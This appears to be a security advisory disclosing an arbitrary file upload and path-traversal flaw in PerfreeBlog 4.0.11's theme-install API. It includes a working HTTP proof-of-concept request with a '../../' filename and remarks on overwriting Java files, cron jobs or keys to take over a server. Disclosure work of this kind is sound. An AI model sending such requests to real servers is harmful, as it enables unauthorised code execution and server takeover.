# Arbitrary File Upload Vulnerability in PerfreeBlog System

## Official Website
https://perfree.org.cn/

## Download Link
https://gitee.com/PerfreeBlog/PerfreeBlog


## Vulnerability Description
The PerfreeBlog system has an arbitrary file upload vulnerability, which allows uploading any file to the server and gaining server privileges.


## Vulnerable Version
Latest version 4.0.11


## Vulnerability Principle
The relevant code details are as follows:
The code for uploading theme files loads the uploaded theme files into the temp directory first without any verification, then executes the `installTheme` function.
![](./img/1.png)
When entering the `installTheme` function, it is found that it first decompresses the file. If the uploaded file is not a zip file, the decompression will fail, and the `file.delete()` function will not be executed. As a result, the uploaded file will be saved in the temp directory. Moreover, directory traversal can be performed using `../`, leading to a file upload vulnerability and potential file overwriting.
![](./img/2.png)


## Vulnerability Reproduction
First, log in to the background and navigate to Theme Management.
![](./img/3.png)

Click "Upload File" and capture the packet.
The interface is:
```
http://127.0.0.1:8086/api/auth/theme/installTheme
```
This interface allows uploading files with any suffix to the temp directory, and directory traversal can be performed using `../`.

```
POST /api/auth/theme/installTheme HTTP/1.1
Host: 127.0.0.1:8086
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlzcyI6InNlY3VyaXR5IiwiaWF0IjoxNzU1NzQ0ODg1LCJhdWQiOiJzZWN1cml0eS1hbGwiLCJleHAiOjE3NTU3NTIwODV9.oniKav5M-QEoR93JWDGv4aa20gVWv7fm6xS07EYQhJ4
Content-Type: multipart/form-data; boundary=----geckoformboundary7dd0f6ff1964a2e44ae9ef79a114ffe3
Content-Length: 232
Origin: http://127.0.0.1:8086
Connection: keep-alive
Referer: http://127.0.0.1:8086/admin/theme
Cookie: 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

------geckoformboundary7dd0f6ff1964a2e44ae9ef79a114ffe3
Content-Disposition: form-data; name="file"; filename="../../1q.java"
Content-Type: text/plain

111111111111111
------geckoformboundary7dd0f6ff1964a2e44ae9ef79a114ffe3--
```
![](./img/4.png)
Successfully uploaded to the target directory. It is also possible to overwrite existing Java files to achieve RCE, as shown in the following figure.
![](./img/5.png)


For Linux systems, it is possible to write cron jobs, public-private keys, etc., to gain server privileges.
